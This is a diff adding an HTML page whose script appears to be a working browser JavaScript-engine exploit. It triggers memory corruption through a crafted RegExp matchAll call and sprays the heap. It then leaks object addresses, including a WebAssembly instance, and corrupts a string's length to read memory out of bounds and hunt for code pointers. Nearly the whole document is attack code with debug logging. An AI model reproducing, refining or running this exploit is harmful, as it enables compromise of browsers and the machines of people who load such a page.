@@ -1,0 +1,129 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P53</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const dec=new TextDecoder("windows-1252");
+const eb=new Uint8Array(0x40);eb.fill(0x41);
+const es=dec.decode(eb);
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // Find LIVE objB
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){
+        if(f2i(m[k+1])===v){
+          const v3=f2i(m[k+2]);const w=v3&0xffffffffn;
+          if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}
+        }
+      }
+    }catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  let OB=-1;
+  for(const k of cands){
+    const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;
+    if(a!==b){OB=k;break;}
+  }
+  if(OB>=0){
+    log("LIVE@"+OB.toString(16));
+    objB[4]=wasmI;const wasmAddr=f2i(m[OB+2])&0xffffffffn;objB[4]=marker;
+    log("W:"+wasmAddr.toString(16));
+    objB[4]=es;const esAddr=f2i(m[OB+2])&0xffffffffn;objB[4]=marker;
+    log("ES:"+esAddr.toString(16));
+    const tq=(esAddr-1n)+8n;const off=tq-0x1080018n;
+    if(off>0n){
+      // ES above PIN: direct write
+      const idx=Number(off>>3n);
+      if((off&7n)===0n){const v=f2i(m[idx]);m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);}
+      else{const i2=Number((off-4n)>>3n);const a=f2i(m[i2]);m[i2]=i2f((0x01200000n<<32n)|(a&0xffffffffn));}
+      log("NL:"+es.length.toString(16));
+    }else{
+      // ES below PIN: find spray header near OB for self-modify
+      const HDR_VAL=(BigInt(MAXS)<<32n)|BigInt(PIN);
+      let hk=-1;
+      for(let dk=-4;dk<=4;dk++){
+        const k=OB+dk;if(k<0)continue;
+        try{if(f2i(m[k])===HDR_VAL){hk=k;break;}}catch(e){}
+      }
+      // Also check near 0x7FFF and 0x8000
+      if(hk<0){for(const k of [0x7FFE,0x7FFF,0x8000,0x8001]){
+        try{if(f2i(m[k])===HDR_VAL){hk=k;break;}}catch(e){}
+      }}
+      if(hk>=0){
+        log("HDR@"+hk.toString(16));
+        // Redirect elements to ES object: new elements = esAddr (tagged)
+        m[hk]=i2f((4n<<32n)|esAddr); // length=2(smi4), elements=esAddr
+        // m[0] now = ES map+hash, m[1] = ES length+?
+        // Write new length at m[1] lo32 (or m[0] hi32 depending on field layout)
+        // ExternalString layout: map(4), hash_or_properties(4), length(4), ...
+        // m[0] = (map, hash), m[1] = (length, first_resource_byte)
+        const esF1=f2i(m[1]);
+        const oldLen=Number(esF1&0xffffffffn);
+        log("OLD_LEN:"+oldLen.toString(16));
+        m[1]=i2f((esF1&0xffffffff00000000n)|0x01200000n);
+        log("NL:"+es.length.toString(16));
+      }else{log("NO_HDR");}
+    }
+    // If length corrupted, scan for code pointers
+    if(es.length>=0x100000){
+      // Dense scan 0x40000-0x80000 at 0x100 steps for code pointers
+      const P=[];
+      for(let o=0x40000;o<0x80000;o+=0x100){
+        try{
+          const b7=es.charCodeAt(o+7);
+          if(b7>=0x55&&b7<=0x56||b7===0x7f){
+            let h="";for(let b=0;b<8;b++)h+=es.charCodeAt(o+b).toString(16).padStart(2,"0");
+            P.push(o.toString(16)+":"+h);if(P.length>=4)break;
+          }
+        }catch(e){P.push("E@"+o.toString(16));break;}
+      }
+      if(P.length>0&&!P[0].startsWith("E"))log("CP:"+P.join(","));
+      else{
+        // Show any non-zero data at large offsets
+        const D=[];
+        for(let o=0x80000;o<0x200000;o+=0x10000){
+          try{
+            let qw=0n;for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(o+b))<<BigInt(b*8);
+            if(qw!==0n){D.push(o.toString(16)+":"+qw.toString(16).slice(-12));if(D.length>=6)break;}
+          }catch(e){D.push("E@"+o.toString(16));break;}
+        }
+        log("D:"+(D.length?D.join(","):"Z"));
+      }
+    }
+  }else{log("STALE");}
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
